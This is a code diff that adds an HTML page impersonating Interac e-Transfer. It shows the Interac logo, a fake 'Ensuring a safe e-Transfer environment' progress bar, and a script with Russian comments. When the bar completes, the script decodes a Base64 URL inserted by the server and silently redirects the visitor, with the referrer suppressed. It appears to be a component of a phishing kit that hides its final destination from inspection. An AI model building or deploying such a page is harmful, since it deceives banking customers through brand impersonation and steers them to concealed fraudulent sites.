@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta name="referrer" content="no-referrer" />
+  <title>Redirecting...</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+
+    img {
+      max-width: 50%;
+      height: auto;
+    }
+
+    .progress {
+      margin-top: 20px;
+      width: 80%;
+      max-width: 400px;
+      height: 20px;
+      background-color: #e0e0e0;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background-color: #76c7c0;
+      transition: width 0.1s;
+    }
+
+    .percentage {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+
+    .circle {
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background-color: #f0f0f0;
+      border: 1px solid #ccc;
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+    }
+  </style>
+</head>
+
+<body>
+  <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
+  <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
+  <div class="progress">
+    <div class="progress-bar" id="progress-bar"></div>
+  </div>
+  <div class="percentage" id="percentage">0%</div>
+
+  <script type="text/javascript">
+    const progressBar = document.getElementById('progress-bar');
+    const percentage = document.getElementById('percentage');
+    let progress = 0;
+
+    const interval = setInterval(() => {
+      progress += 10; // Увеличиваем прогресс каждые 1 секунду
+      progressBar.style.width = progress + '%'; // Устанавливаем ширину шкалы
+      percentage.textContent = progress + '%'; // Отображаем процент
+
+      if (progress >= 100) {
+        clearInterval(interval);
+        
+        // Получаем закодированную ссылку из параметра {Replace}
+        const encodedURL = "{Replace}"; // Будет заменено сервером
+        try {
+          // Декодируем URL из Base64
+          const decodedURL = atob(encodedURL);
+
+          // Перенаправляем пользователя на раскодированную ссылку
+          window.location.replace(decodedURL + window.location.hash);
+        } catch (e) {
+          console.error("Error decoding URL:", e);
+          document.body.innerHTML = "<h1>Error: Invalid or corrupted URL</h1>";
+        }
+      }
+    }, 2500);
+  </script>
+</body>
+
+</html>
